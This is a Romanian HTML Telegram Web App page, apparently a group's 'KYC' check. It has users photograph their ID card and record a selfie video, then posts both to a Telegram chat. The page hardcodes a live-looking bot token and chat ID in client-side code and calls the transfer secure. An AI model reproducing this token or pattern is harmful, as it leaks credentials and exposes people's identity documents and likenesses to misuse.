

<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MostWanted Securitate</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #0a0a0c; color: #ffffff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
        .container { text-align: center; padding: 25px; border-radius: 12px; background: rgba(20, 20, 25, 0.85); border: 1px solid #00E5FF; box-shadow: 0 0 20px rgba(0, 229, 255, 0.15); width: 100%; max-width: 400px; }
        h1 { font-size: 22px; letter-spacing: 2px; color: #00E5FF; margin: 0 0 5px 0; text-shadow: 0 0 10px rgba(0, 229, 255, 0.4); }
        .subtitle { font-size: 10px; color: #888899; margin-bottom: 25px; text-transform: uppercase; }
        .step { display: none; }
        .step.active { display: block; }
        .instructions { font-size: 14px; color: #ccccdd; margin-bottom: 20px; line-height: 1.5; }
        .highlight { color: #00E5FF; font-weight: bold; }
        video, img { width: 100%; max-height: 220px; border-radius: 8px; background: #000; border: 1px dashed #555566; margin-bottom: 20px; object-fit: cover; }
        .btn { background: transparent; color: #00E5FF; border: 2px solid #00E5FF; padding: 12px 24px; font-size: 14px; font-weight: bold; border-radius: 6px; cursor: pointer; text-transform: uppercase; width: 100%; box-sizing: border-box; margin-bottom: 10px; }
        .btn:hover { background: #00E5FF; color: #0a0a0c; box-shadow: 0 0 15px rgba(0, 229, 255, 0.5); }
        .btn-record { border-color: #FF1744; color: #FF1744; }
        #statusText { font-size: 13px; color: #00E5FF; margin-top: 10px; font-weight: bold; }
    </style>
</head>
<body>

<div class="container">
    <h1>MOSTWANTED</h1>
    <div class="subtitle">KYC Verification System</div>

    <div id="step1" class="step active">
        <div class="instructions"><span class="highlight">PASUL 1:</span> Fotografiază clar partea din față a buletinului.</div>
        <input type="file" id="idInput" accept="image/*" capture="environment" style="display: none;">
        <img id="idPreview" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='24' height='24' fill='none' stroke='%23333'><rect x='3' y='4' width='18' height='16' rx='2'/></svg>" alt="ID">
        <button class="btn" onclick="document.getElementById('idInput').click()">📷 Fă poză la Buletin</button>
        <button class="btn" id="nextStepBtn" style="display: none;" onclick="goToStep2()">Continuă ➔</button>
    </div>

    <div id="step2" class="step">
        <div class="instructions"><span class="highlight">PASUL 2:</span> Înregistrează un clip de 5 secunde în care spui clar: <br><span class="highlight">"Data de azi și MostWanted"</span></div>
        <video id="videoPreview" autoplay muted playsinline></video>
        <button class="btn btn-record" id="recordBtn" onclick="toggleRecording()">🎥 Pornește Înregistrarea</button>
        <div id="statusText"></div>
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const BOT_TOKEN = "8309275788:AAEfr_9zmaV6BmYKO4ISlEUITpInK-Fm6uk"; 
    const CHAT_ID = "-1003936586656"; 

    let idBlob = null;
    let stream;
    let mediaRecorder;
    let recordedChunks = [];

    document.getElementById('idInput').addEventListener('change', function(e) {
        idBlob = e.target.files[0];
        if (idBlob) {
            const reader = new FileReader();
            reader.onload = function(event) {
                document.getElementById('idPreview').src = event.target.result;
                document.getElementById('nextStepBtn').style.display = 'block';
            };
            reader.readAsDataURL(idBlob);
        }
    });

    async function goToStep2() {
        document.getElementById('step1').classList.remove('active');
        document.getElementById('step2').classList.add('active');
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
            document.getElementById('videoPreview').srcObject = stream;
        } catch (err) { 
            alert("Te rugăm să permiți accesul la cameră și microfon pentru verificare."); 
        }
    }

    function toggleRecording() {
        const btn = document.getElementById('recordBtn');
        const status = document.getElementById('statusText');

        if (mediaRecorder && mediaRecorder.state === "recording") {
            mediaRecorder.stop();
        } else {
            recordedChunks = [];
            
            // Corecție automată codec video pentru compatibilitate maximă iOS / Android
            let options = { mimeType: 'video/webm;codecs=vp9' };
            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                options = { mimeType: 'video/mp4' };
            }

            try {
                mediaRecorder = new MediaRecorder(stream, options);
            } catch(e) {
                mediaRecorder = new MediaRecorder(stream);
            }

            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
            
            mediaRecorder.onstop = async () => {
                const videoBlob = new Blob(recordedChunks, { type: mediaRecorder.mimeType });
                
                if(stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                
                status.innerText = "⏳ Se trimit datele securizat...";
                
                try {
                    await trimiteLaTelegram(idBlob, videoBlob);
                    status.innerText = "✅ Finalizat! Se închide...";
                    setTimeout(() => tg.close(), 1500);
                } catch(err) {
                    status.innerText = "❌ Eroare la trimitere. Reîncearcă.";
                    alert("A apărut o eroare la conexiune. Asigură-te că ai semnal bun.");
                }
            };

            mediaRecorder.start();
            btn.innerText = "🛑 Oprește Înregistrarea";
            status.innerText = "🔴 Înregistrare pornită! Vorbește acum...";
            
            // Oprește automat după 6 secunde dacă utilizatorul uită să apese stop
            setTimeout(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 6000);
        }
    }

    async function trimiteLaTelegram(photoFile, videoFile) {
        let user = tg.initDataUnsafe.user ? `@${tg.initDataUnsafe.user.username} (${tg.initDataUnsafe.user.first_name})` : "Utilizator Nou";
        
        // 1. Trimitere Fotografie Buletin
        let formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", photoFile, "buletin.jpg");
        formData.append("caption", `🪪 **VERIFICARE NOUĂ**\nUtilizator: ${user}\n\nVerifică buletinul mai jos. Clipul video urmează în următorul mesaj.`);
        formData.append("parse_mode", "Markdown");

        let resPhoto = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
        if (!resPhoto.ok) throw new Error("Eroare sendPhoto");

        // 2. Trimitere Clip Video
        let videoData = new FormData();
        videoData.append("chat_id", CHAT_ID);
        // Setăm extensia potrivită în funcție de tipul de fișier înregistrat de dispozitiv
        let ext = mediaRecorder.mimeType.includes('mp4') ? 'mp4' : 'webm';
        videoData.append("video", videoFile, `verificare.${ext}`);
        
        let resVideo = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: "POST", body: videoData });
        if (!resVideo.ok) throw new Error("Eroare sendVideo");
    }
</script>
</body>
</html>
